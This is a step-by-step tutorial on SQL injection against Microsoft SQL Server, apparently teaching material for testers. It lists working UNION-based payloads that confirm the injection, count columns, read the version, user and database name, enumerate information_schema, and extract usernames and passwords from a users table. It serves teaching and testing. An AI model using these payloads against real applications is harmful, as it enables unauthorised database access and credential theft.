# Microsoft SQL Server Database

## Introduction

Microsoft SQL Server (MSSQL) is a Relational Database Management System (RDBMS) developed by Microsoft.

It is widely used in enterprise applications, financial systems, healthcare, government organizations, and Windows-based environments.

Microsoft SQL Server has its own SQL syntax, system tables, and built-in functions. Therefore, SQL Injection payloads used for SQL Server are different from those used for Oracle, PostgreSQL, MySQL, or SQLite.

---

# Microsoft SQL Server SQL Injection Methodology

When testing a Microsoft SQL Server-based application, follow this process.

```
Identify Injection Point
        │
        ▼
Confirm SQL Injection
        │
        ▼
Determine Number of Columns
        │
        ▼
Find Text Column
        │
        ▼
Confirm SQL Server Database
        │
        ▼
Retrieve Database Version
        │
        ▼
Retrieve Current User
        │
        ▼
Retrieve Current Database
        │
        ▼
Enumerate Tables
        │
        ▼
Enumerate Columns
        │
        ▼
Extract Data
```

---

# Step 1 - Identify the Injection Point

Find user-controlled input such as:

- URL Parameters
- Search Box
- Login Form
- POST Parameters
- Cookies

Example:

```
https://example.com/filter?category=Accessories
```

Injection Point:

```
category
```

---

# Step 2 - Confirm SQL Injection

Test with:

```sql
'
```

If the application returns an SQL error, the parameter may be vulnerable.

Next test:

```sql
'--
```

If the page loads normally, SQL comments are working.

Next test:

```sql
' OR 1=1--
```

If more data is displayed, SQL Injection is confirmed.

---

# Step 3 - Determine the Number of Columns

Use the `ORDER BY` technique.

```sql
' ORDER BY 1--
```

```sql
' ORDER BY 2--
```

```sql
' ORDER BY 3--
```

Increase the number until an error occurs.

The previous successful number is the total number of columns.

---

# Step 4 - Find the Text Column

Use `UNION SELECT`.

Example:

```sql
' UNION SELECT NULL,NULL--
```

Replace each `NULL` with text.

Example:

```sql
' UNION SELECT 'TEST',NULL--
```

or

```sql
' UNION SELECT NULL,'TEST'--
```

The column displaying **TEST** is the text column.

---

# Step 5 - Confirm Microsoft SQL Server

Retrieve the SQL Server version.

```sql
' UNION SELECT NULL,@@version--
```

If the application displays a Microsoft SQL Server version string, the backend database is SQL Server.

---

# Step 6 - Retrieve Database Version

```sql
' UNION SELECT NULL,@@version--
```

Example Output

```
Microsoft SQL Server 2022
```

---

# Step 7 - Retrieve Current User

```sql
' UNION SELECT NULL,SYSTEM_USER--
```

---

# Step 8 - Retrieve Current Database

```sql
' UNION SELECT NULL,DB_NAME()--
```

---

# Step 9 - Enumerate Tables

Microsoft SQL Server stores table information inside:

```
information_schema.tables
```

Example:

```sql
' UNION SELECT NULL,table_name
FROM information_schema.tables--
```

---

# Step 10 - Enumerate Columns

Microsoft SQL Server stores column information inside:

```
information_schema.columns
```

Example:

```sql
' UNION SELECT NULL,column_name
FROM information_schema.columns
WHERE table_name='users'--
```

---

# Step 11 - Extract Data

After identifying the required table and columns:

```sql
' UNION SELECT username,password
FROM users--
```

---

# Microsoft SQL Server System Tables

| Table | Purpose |
|-------|---------|
| information_schema.tables | List all tables |
| information_schema.columns | List all columns |
| sys.tables | List user tables |
| sys.columns | List table columns |

---

# Summary

1. Identify the injection point.
2. Confirm SQL Injection.
3. Find the number of columns.
4. Find the text column.
5. Confirm Microsoft SQL Server.
6. Retrieve database version.
7. Retrieve current user.
8. Retrieve current database.
9. Enumerate tables.
10. Enumerate columns.
11. Extract data.
